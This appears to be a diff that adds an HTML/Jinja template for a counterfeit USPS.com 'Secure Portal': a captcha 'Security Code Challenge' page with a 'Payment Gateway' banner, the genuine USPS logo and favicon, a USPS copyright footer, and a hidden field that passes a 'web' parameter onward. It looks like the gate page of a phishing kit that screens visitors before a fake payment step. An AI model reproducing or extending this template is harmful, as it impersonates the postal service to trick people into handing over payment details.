@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USPS.com – Secure Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+	<link data-testid="favicon" id="favicon" rel="icon" href="https://www.usps.com/assets/images/home/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Helvetica Neue", Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f3f3f3;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* Header Styles */
+        header {
+            background: linear-gradient(to bottom, #faf9f6 0%, #faf9f6 100%);
+            color: #333366;
+            padding: 12px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-bottom: 6px solid #333366;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 40px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-icon {
+            width: 221px;
+            height: 34px;
+            background: #faf9f6;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+			padding: 4px;
+            box-shadow: 0 0px 0px rgba(0,0,0,0.2);
+        }
+        
+        .logo-icon svg {
+            width: 118px;
+            height: 60px;
+			padding: 20px
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+        
+        .header-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .header-links a {
+            color: #333366;
+            text-decoration: none;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-links a i {
+            margin-right: 5px;
+            font-size: 16px;
+        }
+        
+        .header-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Main Content Styles */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f8f8f8"/><path d="M0,0 L100,100 M100,0 L0,100" stroke="%23eeeeee" stroke-width="1"/></svg>');
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+        }
+        
+        .login-header {
+            background: linear-gradient(to bottom, #f8f8f8 0%, #eaeaea 100%);
+            padding: 20px 30px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .login-header h1 {
+            font-size: 22px;
+            color: #333366;
+            margin-bottom: 8px;
+        }
+        
+        .login-header p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .login-body {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            padding-right: 40px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #333366;
+            box-shadow: 0 0 0 2px rgba(0, 75, 135, 0.2);
+        }
+        
+        .password-toggle {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 40px;
+            color: #666;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            font-size: 18px;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to bottom, #333366 0%, #333366 100%);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .btn-login:hover {
+            background: linear-gradient(to bottom, #333366 0%, #002c55 100%);
+        }
+        
+        .login-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        .login-links a {
+            color: #333366;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .login-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .security-note {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border-radius: 4px;
+            border-left: 4px solid #333366;
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .security-note i {
+            color: #333366;
+            margin-right: 8px;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #e6e6e6;
+            padding: 25px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #d0d0d0;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: #333366;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+            
+            .logo {
+                margin-bottom: 10px;
+            }
+            
+            .login-container {
+                margin: 0 15px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+        
+        /* Alert Banner */
+        .alert-banner {
+            background-color: #ffc107;
+            color: #856404;
+            padding: 7px 0;
+            text-align: center;
+            font-size: 12px;
+            border-bottom: 1px solid #ffb007;
+        }
+        
+        .alert-banner a {
+            color: #333366;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="alert-banner">
+            <i class="fas fa-exclamation-circle"></i> Authentication is required to access the <a href="#">Payment Gateway</a>! 
+        </div>
+        
+        <header>
+            <div class="header-container">
+                <!-- <div class="logo"> -->
+                    <div class="logo-icon">
+						<img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg"/>
+							<!--
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
+							
+                            <path fill="#333366" d="M16,4L4,10v12l12,6l12-6V10L16,4z M16,25.5L6,20v-8l10-5l10,5v8L16,25.5z"/>
+                            <polygon fill="#333366" points="16,16 6,10 16,4 26,10"/>
+                            <polygon fill="#333366" points="16,16 16,26 6,20 6,10"/>
+                            <polygon fill="#333366" points="26,10 26,20 16,26 16,16"/> 
+							
+                        </svg>
+						-->
+                    </div>
+                    <span class="logo-text"></span>
+                <!-- </div> -->
+                
+                <div class="header-links">
+                    <a href="#"><i class="fas fa-question-circle"></i> Help</a>
+                    <a href="#"><i class="fas fa-envelope"></i> Contact Us</a>
+                </div>
+            </div>
+        </header>
+        
+        <main class="main-content">
+            <div class="login-container">
+                <div class="login-header">
+                    <h1>Security Code Challenge</h1>
+                    <p>Solve the following tasks to prove that you are human</p>
+                </div>
+                
+                <div class="login-body">
+                    <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
+                        <div class="form-group">
+							
+                            <!--
+							<label for="username">Username</label>
+                            <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter your username">
+							-->
+                        </div>
+                        
+                        <div class="form-group password-toggle">
+							
+                            <label for="password" style="display:flex"><div id="captcha-container" style="display:center">{{ code }}</div></label>
+							<input id="captcha-input" type="text" placeholder="Please enter the code above" name="code" required>
+							<input type="hidden" name="web" value="{{ request.args.get('web') }}">
+							
+                            
+                        </div>
+                        
+                        <button type="submit" id="captcha-submit" class="btn-login">Submit</button>
+                        
+                        <div class="login-links">
+                            <a href="#"><i class="fas fa-question-circle"></i> Other Payment Methods?</a>
+                            <a href="#"><i class="fas fa-lock"></i> Pay Your Bills Securely?</a>
+                        </div>
+                    </form>
+					<p id="captcha-message"></p>
+                    
+                    <div class="security-note">
+                        <p><i class="fas fa-shield-alt"></i> For your security, please log out and exit your web browser when you are done.</p>
+						<p type="hidden" id="info-text"></p>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <footer>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Careers</a>
+                <a href="#">Site Index</a>
+                <a href="#">USPS.com</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 USPS.com. All rights reserved.
+            </div>
+        </footer>
+    </div>
+
+    <script>
+       
+        // Verify if user input matches the code
+        var captchaForm = document.getElementById('captcha-form');
+        var errorMessage = document.getElementById('captcha-message');
+
+        captchaForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            var captchaInput = document.getElementById('captcha-input');
+
+            if (captchaInput.value == "{{ code }}") {
+                // Submit the form
+                captchaForm.submit();
+            } else {
+                errorMessage.innerText = 'Sorry, the code you entered is incorrect. Please try again.';
+                errorMessage.style.display = 'block'; // Show error message
+                captchaInput.value = '';
+            }
+        });
+    </script>
+</body>
+</html>
